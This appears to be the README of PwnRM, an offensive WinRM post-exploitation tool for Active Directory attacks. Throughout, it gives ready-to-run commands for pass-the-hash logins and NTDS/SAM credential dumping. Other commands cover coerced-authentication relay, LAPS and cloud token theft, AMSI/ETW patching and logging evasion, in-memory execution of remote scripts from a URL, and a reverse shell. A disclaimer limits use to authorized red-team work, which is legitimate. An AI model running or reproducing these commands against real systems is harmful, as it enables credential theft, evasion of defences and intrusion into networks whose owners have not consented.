<div align="center">

![PwnRM ASCII](src/photos/logo.png)

**Advanced WinRM Post-Exploitation Platform for Windows Active Directory Testing**

![GitHub stars](https://img.shields.io/github/stars/uziii2208/PwnRM?style=for-the-badge&color=gold&logo=github)
[![Hall of Fame](https://img.shields.io/badge/Hall_of_Fame-🏆_h4x0rc-gold?style=for-the-badge&logo=trophy)](HALL_OF_FAME.md)
![GitHub forks](https://img.shields.io/github/forks/uziii2208/PwnRM?style=for-the-badge&color=blue&logo=github)
![GitHub issues](https://img.shields.io/github/issues/uziii2208/PwnRM?style=for-the-badge&color=red&logo=github)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=opensourceinitiative)
![PyPI](https://img.shields.io/pypi/v/pwnrm?style=for-the-badge&color=cyan&logo=pypi)
[![Changelog](https://img.shields.io/badge/Changelog-v2.1.0-blueviolet?style=for-the-badge&logo=git)](CHANGELOG.md)
![Platform](https://img.shields.io/badge/Platform-Cross--Platform-orange?style=for-the-badge&logo=windows)
[![Tests](https://img.shields.io/badge/Tests-41%20Passed%20(100%25)-brightgreen?style=for-the-badge&logo=pytest)](tests/)
[![Documentation](https://img.shields.io/badge/Documentation-Complete_Suite-success?style=for-the-badge&logo=readthedocs)](docs/README.md)

An operator-grade WinRM execution and red team platform for authorized Active Directory security assessments (2026–2027 TTPs): in-memory VSS extraction, coerced authentication suite, Windows LAPS & Server 2025 hunting, AD DACL privilege escalation scout, token impersonation, multi-session graph orchestration, in-band SOCKS5 multiplexing, full ADCS ESC1-ESC17+ (incl. WSUS abuse), Diamond Ticket suite, hybrid Entra ID pivoting, polymorphic evasion runtime, in-memory BloodHound collection, and structured loot pipeline - usable as a CLI tool **and** as a Python library.

[Installation](#installation) · [Usage](#usage) · [Commands](#commands) · [Niche Modules](#niche-modules) · [AD Triage](#ad-triage) · [Documentation](docs/README.md) · [Share Scout](#share-scout) · [Session Scout](#session-scout) · [Changelog](CHANGELOG.md) · [Library Usage](#library-usage) · [Troubleshooting](#troubleshooting) · [Disclaimer](#disclaimer) · [Hall Of Fame](HALL_OF_FAME.md)

</div>

---

<a id="installation"></a>
## 📦 Installation

### pip (recommended)

```bash
pip install pwnrm

# Update to latest version
pip install --upgrade pwnrm
```

### git clone + installer (Kali / Ubuntu / Debian)

```bash
git clone https://github.com/uziii2208/PwnRM.git
cd PwnRM
sudo bash install.sh
```

The installer creates a virtualenv at `/opt/pwnrm` and registers a global `pwnrm` wrapper.

### Manual / Developer Setup

```bash
git clone https://github.com/uziii2208/PwnRM.git
cd PwnRM
python3 -m venv venv && source venv/bin/activate
pip install -e .
```

---

<a id="usage"></a>
## Connection & Authentication Usage

```bash
# 1. Standard Password Authentication
pwnrm -u Administrator -p 'P@ssw0rd!' 192.168.1.10

# 2. Pass-the-Hash (NTLM Hash)
pwnrm -u Administrator -H :aad3b435b51404eeaad3b435b51404ee dc01.corp.local

# 3. Kerberos Authentication (ccache / KRB5CCNAME)
pwnrm -u administrator@CORP.LOCAL -k --ccache /tmp/admin.ccache dc01.corp.local

# 4. Mutual TLS Client Certificate (ADCS ESC1 / ESC9 / Shadow Credentials)
pwnrm -u administrator@CORP.LOCAL --pfx admin.pfx --pfx-pass secret https://dc01:5986

# 5. CredSSP (Multi-Hop Credential Delegation)
pwnrm -u admin -p 'P@ss' --credssp dc01.corp.local

# 6. Dead Reckoning Replay Mode (Replay sequence from session transcript log)
pwnrm -u admin -p 'P@ss' 192.168.1.10 --replay ~/.pwnrm/pwnrm_1725000000_stdout.log

# 7. Non-Interactive Single Command Execution
pwnrm -u admin -p 'P@ss' dc01.corp.local -X "whoami /all"
```

**Key Flags**: `--port`, `--ssl`, `--timeout`, `--ts`, `--debug`, `--replay`, `-X`. Run `pwnrm -h` for the full list.

---

<a id="commands"></a>
## Complete Interactive Shell Commands

PwnRM v2.1 provides 13 specialized built-in modules alongside core platform commands:

| Category | Command | Description |
| :--- | :--- | :--- |
| **Core Platform** | `!session [list, switch, save, exec-all]` | Multi-session manager & jump graph orchestrator |
| | `!socks [PORT, stop, status]` | In-band SOCKS5 proxy multiplexer (default: 1080) |
| | `!portfwd [LPORT RHOST:RPORT, list, stop]` | Local & remote port forwarding multiplexer |
| | `!module [list, run <name>]` | Extensible plugin subsystem & module runner |
| | `!loot` | Structured credential & artifact inventory viewer |
| | `!opsec [stealth, balanced, aggressive, hybrid-cloud]` | Dynamic execution jitter & OPSEC profile switcher |
| | `!playbook [--list, --run <name>]` | Declarative red team playbook runner |
| **Identity & AD Abuse** | `!adcs [-q, --template <T>, --wsus]` | Full ADCS ESC1-ESC17+ engine & certificate/WSUS triage |
| | `!kerberos [--roast, --asrep, --dmsa, --diamond]` | Advanced Kerberos suite (AES roasting, dMSA/BadSuccessor) |
| | `!entra [-s]` | Hybrid Entra ID / Azure AD PRT pivot & join state recon |
| | `!creds [--vault, --dpapi, --history]` | Deep credential & token artifact hunter |
| | `!laps [-a, --encrypted]` | Windows LAPS hunter (Legacy ms-Mcs-AdmPwd & Server 2025 msLAPS) |
| | `!acl [--target <T>, --tier0]` | Active Directory DACL & Tier-0 privilege escalation scout |
| | `!token [--list, --privs, --elevate]` | Process token hunter & in-memory impersonation suite |
| | `!bloodhound [-c <methods>]` | In-memory Active Directory graph collector (BloodHound CE) |
| | `!lateral [--subnet <s>]` | Subnet scout & lateral movement engine |
| **In-Memory & Staging** | `!vss [--drive C:, --sam, --ntds, --clean]` | In-memory VSS shadow copy hive extractor (SAM/SYSTEM/NTDS) |
| | `!coerce --listener <IP> [--method M]` | Coerced authentication engine (WebDAV, MS-RPRN, MS-EFSR, DFS) |
| | `!evasion [--edr, --amsi, --etw]` | Polymorphic AMSI/ETW memory patching & EDR scout |
| | `!download RPATH [LPATH]` | Pull file/dir from target (dirs auto-zipped) |
| | `!upload [-xor] LPATH [RPATH]` | Push file; `-xor` for encrypted staging |
| | `!amsi` | Patch `AmsiScanBuffer` in the remote process (polymorphic) |
| | `!psrun [-xor] URL` | Execute remote PowerShell via obfuscated ScriptBlock |
| | `!netrun [-xor] URL [ARG..]` | Load & invoke remote .NET assembly in-memory |
| | `!revshell IP PORT` | Raw Winsock reverse shell (full I/O, no cmd logging) |
| **Triage & Snapshot** | `!adtriage [-q]` | Built-in Active Directory enumeration engine |
| | `!shares [-q] [HOST ..]` | SMB share scout - UNC access, ACLs, SYSVOL GPP cPassword |
| | `!sessions [-q]` | Session & network snapshot - logon sessions, tickets, TCP |
| | `!sysinfo` | OS / AV / hotfix / local-admin snapshot |
| | `!log` / `!stoplog` | Toggle session transcript |
| | `exit` / `quit` / `Ctrl+D` | Close session (`Ctrl+C` interrupts running commands) |

---

<a id="niche-modules"></a>
## Niche Operator Modules & TTPs [v2.1.0]

### 1. In-Memory VSS Shadow Copy Hive Extractor (`!vss`)
Extracts locked credentials databases (`SAM`, `SYSTEM`, `SECURITY`, and `NTDS.dit`) directly via **WMI / CIM COM reflection (`[wmiclass]"Win32_ShadowCopy"`)**.
- **Anti-EDR Design**: Does **not** invoke `vssadmin.exe` or `ntdsutil.exe` (which immediately trigger EDR process-creation alerts).
- **Forensic Hygiene**: Instantly calls `.Delete()` on the created shadow copy upon extraction, leaving zero residual shadow copies on disk.
- **Commands**:
  ```powershell
  !vss                    # Extract SAM and SYSTEM from C:
  !vss --drive E:         # Extract from alternate volume
  !vss --ntds             # Extract active NTDS.dit and SYSTEM on Domain Controllers
  !vss --clean            # Enforce cleanup of lingering shadow copies
  ```

### 2. Coerced Authentication Engine (`!coerce`)
Triggers outbound authentication from the target machine account or server to an operator listener (Responder / `ntlmrelayx`), supporting 4 distinct coercion methods:
1. **WebDAV HTTP UNC Paths**: `\\listener@80\share\dummy.txt` forces the WebClient service to authenticate over HTTP instead of SMB — **bypassing SMB signing** and enabling direct relaying to ADCS ESC8 Web Enrollment.
2. **MS-RPRN Print Spooler**: In-memory RPC trigger targeting `\pipe\spoolss`.
3. **MS-EFSR PetitPotam**: In-memory RPC trigger targeting `\pipe\efsrpc` and `\pipe\lsarpc`.
4. **MS-DFSNM**: In-memory RPC trigger targeting `\pipe\netdfs`.
- **Commands**:
  ```powershell
  !coerce --listener 10.10.14.5                    # WebDAV HTTP coercion (default, port 80)
  !coerce --listener 10.10.14.5 --method spooler  # MS-RPRN Print Spooler coercion
  !coerce --listener 10.10.14.5 --method efs      # MS-EFSR PetitPotam coercion
  !coerce --listener 10.10.14.5 --method all      # Dispatch all coercion vectors
  ```

### 3. Windows LAPS & Server 2025 Password Hunter (`!laps`)
Performs 100% in-memory LDAP directory queries for local administrator passwords managed by Windows LAPS:
- **Legacy LAPS**: `ms-Mcs-AdmPwd` (cleartext password) and `ms-Mcs-AdmPwdExpirationTime`.
- **Modern Server 2025 / Windows 11 LAPS**: `msLAPS-Password` (cleartext), `msLAPS-EncryptedPassword`, `msLAPS-EncryptedDSRMPassword`, and `msLAPS-PasswordHistory`.
- **Commands**:
  ```powershell
  !laps                 # Query all cleartext LAPS passwords
  !laps -a              # Enumerate all domain computers and LAPS status
  !laps --encrypted     # Display and catalog modern Server 2025 encrypted LAPS blobs
  ```

### 4. Active Directory DACL & Privilege Escalation Scout (`!acl`)
Audits Discretionary Access Control Lists (DACLs) on Tier-0 and high-value objects (`AdminSDHolder`, `Domain Admins`, `Domain Controllers`, `krbtgt`, GPOs).
- Flags exploitable rights: `GenericAll`, `WriteDacl` (modify ACL to gain full control), `WriteOwner` (take ownership), `GenericWrite`, and `User-Force-Change-Password` (Extended Right GUID `00299570-246d-11d0-a768-00aa006e0529`).
- **Commands**:
  ```powershell
  !acl                                # Audit standard Tier-0 objects
  !acl --target "Domain Admins"       # Inspect DACLs on specific target group/user
  !acl --tier0                        # Deep scan across all Tier-0 OUs and GPOs
  ```

### 5. Process Token Hunter & In-Memory Impersonation (`!token`)
Inspects token privileges and accessible process tokens across active user sessions.
- Evaluates high-impact rights: `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTcbPrivilege`.
- Discovers SYSTEM and Administrator processes suitable for token duplication or named pipe impersonation without dropping binaries to disk.
- **Commands**:
  ```powershell
  !token                 # Run privilege audit and process token inventory
  !token --privs         # Detailed exploitation guide for enabled privileges
  !token --list          # Full process token user mapping
  ```

---

<a id="ad-triage"></a>
## Identity, ADCS & Kerberos Exploitation

### Full ADCS Engine (`!adcs`)
Comprehensive Active Directory Certificate Services audit covering **ESC1 through ESC17+**:
- **ESC1 / ESC2**: Enrollee supplies SAN (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1`) with Client Authentication / Any Purpose EKUs.
- **ESC3 / ESC4**: Certificate Request Agent (`1.3.6.1.4.1.311.20.2.1`) and vulnerable template ACLs.
- **ESC6 / ESC7**: CA `EDITF_ATTRIBUTESUBJECTALTNAME2` registry flag & vulnerable CA permissions.
- **ESC17 (WSUS & Code Signing Policy Abuse)**: Detects Code Signing (`1.3.6.1.5.5.7.3.3`) and Windows Update templates combined with WSUS client registry policy `AcceptTrustedPublisherCerts = 1` and cleartext HTTP `WUServer` endpoints.

### Advanced Kerberos Suite (`!kerberos`)
- **AES Kerberoasting**: Requests TGS tickets with AES256-CTS-HMAC-SHA1-96 priority (for modern RC4-deprecated AD).
- **AS-REP Roasting**: Queries accounts with `DONT_REQ_PREAUTH` (`0x400000`).
- **Diamond Ticket Workflow**: Assists in identity-swap TGT crafting to evade KDC anomaly detection.
- **Server 2025 dMSA / BadSuccessor**: Inspects Delegated Managed Service Accounts (`msDS-DelegatedManagedServiceAccount`) and `BadSuccessor` takeover paths.

### Hybrid Entra ID / Cloud Pivot (`!entra`)
- Evaluates `dsregcmd /status` (`AzureAdJoined`, `DomainJoined`, `EnterpriseJoined`).
- Identifies Web Account Manager (WAM) token broker caches (`Microsoft.AAD.BrokerPlugin`) and Primary Refresh Token (PRT) artifacts.
- Extracts Azure CLI (`accessTokens.json`) and Azure PowerShell credential caches.

---

<a id="platform-features"></a>
## Operator Platform Subsystems

### In-Band PSRP SOCKS5 Proxy & Port Forwarding (`!socks`, `!portfwd`)
- `!socks 1080`: Spawns a local RFC 1928 SOCKS5 proxy multiplexed over existing WinRM PSRP streams — **no listening ports opened on target, zero binary drops**.
- `!portfwd <LPORT> <RHOST>:<RPORT>`: Direct local port forwarding to internal subnet targets.
- **Thread Safety**: Hardened with thread-safe mutex locks and socket timeout protection.

### Multi-Session Manager & Jump Graph (`!session`)
- `!session list`: View all active concurrent target runspaces.
- `!session switch <id>`: Switch interactive context instantly.
- `!session exec-all <cmd>`: Non-blocking fan-out command execution across all targets with `[S:X | Host]` output tagging.
- `!session save`: Ephemeral `Fernet` encrypted session state serialization under `~/.pwnrm/sessions/`.

### Structured Loot Pipeline (`!loot`)
- Automatically catalogs collected credentials (`credentials.json`), certificates (`.pfx`, `.pem`), Kerberos tickets (`.ccache`), DPAPI master keys, and memory dumps under `~/.pwnrm/loot/<target>/`.
- Maintains an operational `MANIFEST.json` with SHA-256 integrity checksums and timestamped source commands.

### OPSEC Profiles & Polymorphic AST Obfuscation (`!opsec`)
- 4 Profiles: `stealth`, `balanced`, `aggressive`, `hybrid-cloud`.
- **AST Obfuscation**: In `stealth` and `hybrid-cloud` profiles, automatically inserts dynamic backticks inside cmdlet names (e.g. `G`e`t`-`P`r`o`c`e`s`s`) and randomizes whitespace to defeat static ScriptBlockLogging signatures.
- **CSPRNG Jitter**: Uses `secrets` module for randomized inter-command delay jitter.

---

<a id="share-scout"></a>
## Share Scout (`!shares`)
`!shares` runs self-contained SMB share enumeration entirely inside the remote PowerShell session - no extra binaries on target. `-q` = quick mode.
Covers: local share inventory via `Win32_Share` · UNC access testing (read **and** write probe) · ACL quick-wins flagging `Everyone / Authenticated Users` write rights · SYSVOL/NETLOGON sensitive file sweep · **GPP `cPassword` auto-detection** (CVE-2014-1812) · active SMB sessions (`net session`).

<a id="session-scout"></a>
## Session Scout (`!sessions`)
`!sessions` runs self-contained active logon session and network snapshot entirely inside the remote PowerShell session. `-q` = quick mode.
Covers: interactive / remote / service logon sessions via `Win32_LogonSession` · RDP client MRU and saved credentials from registry · Kerberos ticket cache (`klist`) · established TCP connections with process attribution · listening port inventory with service labels (RDP, MSSQL, WinRM, etc.) · named pipe exposure (`lsass`, `spoolss`, `samr`...) · SYSTEM scheduled tasks.

---

<a id="library-usage"></a>
## Python Library Usage

PwnRM can be imported directly into Python automation scripts and custom C2 frameworks:

```python
from pwnrm import Runspace, PwnShell, create_transport, argument_parser, SessionManager, Socks5Server

# Parse CLI or programmatic arguments
args = argument_parser().parse_args(["-u", "admin", "-p", "P@ss", "10.0.0.5"])

# Establish MS-PSRP Runspace
with Runspace(create_transport(args), int(args.timeout)) as rs:
    shell = PwnShell(rs)
    
    # 1. Blocking execution with 1MB OOM safety cap
    output = shell.run_sync("whoami /all")
    print(output)
    
    # 2. Async streaming execution
    for record in rs.run_command("Get-Process"):
        if "stdout" in record:
            print(record["stdout"], end="")
            
    # 3. Spawn In-Band SOCKS5 Proxy
    socks = Socks5Server(bind_host="127.0.0.1", bind_port=1080)
    socks.start()
```

---

## Repository Layout

```
PwnRM/
├── src/pwnrm/
│   ├── __init__.py            # Public API & version 2.1.0
│   ├── __main__.py            # python -m pwnrm entry point
│   ├── cli.py                 # CLI entry point & Dead Reckoning replay dispatcher
│   ├── core/                  # Transport, Runspace, SessionMgr, Tunnel, Loot, OPSEC
│   ├── modules/               # 13 Builtin Modules:
│   │   ├── adcs.py            # Full ADCS ESC1-ESC17+ & WSUS Engine
│   │   ├── kerberos.py        # AES Kerberoasting, AS-REP, RBCD, Diamond & dMSA
│   │   ├── entra.py           # Hybrid Entra ID / Azure AD PRT Pivot
│   │   ├── creds.py           # Deep Credential & DPAPI Decryption Hunter
│   │   ├── laps.py            # Windows LAPS (Legacy & Server 2025) Hunter
│   │   ├── acl.py             # AD DACL & Tier-0 Privilege Escalation Scout
│   │   ├── token.py           # Process Token Hunter & Impersonation Suite
│   │   ├── vss.py             # In-Memory VSS Shadow Copy Extractor (SAM/NTDS)
│   │   ├── coerce.py          # Coerced Auth Engine (WebDAV, MS-RPRN, MS-EFSR)
│   │   ├── evasion.py         # Polymorphic AMSI/ETW Memory Patching & EDR Scout
│   │   ├── bloodhound.py      # In-Memory BloodHound CE Graph Collector
│   │   ├── lateral.py         # Subnet Scout & Lateral Movement Dispatcher
│   │   └── playbook.py        # Declarative Playbook Automation Engine
│   ├── shell/                 # PwnShell v2.1 REPL, built-in commands, UI
│   └── resources/             # adtriage.ps1 · shares.ps1 · sessions.ps1
├── tests/                     # 41 Automated Unit & Security Regression Tests
├── docs/                      # Complete 6-Part Deep Technical Documentation Suite
├── CHANGELOG.md               # Full Release & Security Advisory History
├── pyproject.toml             # PyPI packaging (v2.1.0)
├── install.sh                 # Linux installer
└── requirements.txt
```

---

<a id="troubleshooting"></a>
## Troubleshooting

| Issue | Root Cause | Remediation |
| :--- | :--- | :--- |
| `pwnrm: command not found` | PATH not configured | Run `pip install pwnrm` or `sudo bash install.sh` |
| `KRB_AP_ERR_SKEW` | Clock desynchronization with KDC | Run `sudo ntpdate <DC_IP>` or configure chrony |
| WinRM connection refused (5985/5986) | PSRemoting disabled on target | On target: `Enable-PSRemoting -Force` |
| AMSI catches remote payloads | Strict runtime ScriptBlock inspection | Run `!evasion` or `!amsi` first, or stage via `!upload -xor` |
| Download stream fails integrity check | Wire corruption / Base64 truncation | Verify WinRM connection MTU or use `-ssl` for TLS transport |

---
## Disclaimer

> [!IMPORTANT]
> PwnRM is designed for **authorized** security testing, red-team engagements, and educational research only. You must have explicit written authorization (Rules of Engagement / signed scope) before executing PwnRM against any target infrastructure. The authors assume no liability for misuse.

## Credits & License

- **Author**: **uziii2208**
- **Underlying Protocol Libraries**: Built upon [Impacket](https://github.com/fortra/impacket) & [pypsrp](https://github.com/jborean93/pypsrp).
- **License**: MIT — see [LICENSE](LICENSE.md).

<div align="center">

**ENJOY YOUR MEAL.** 

</div>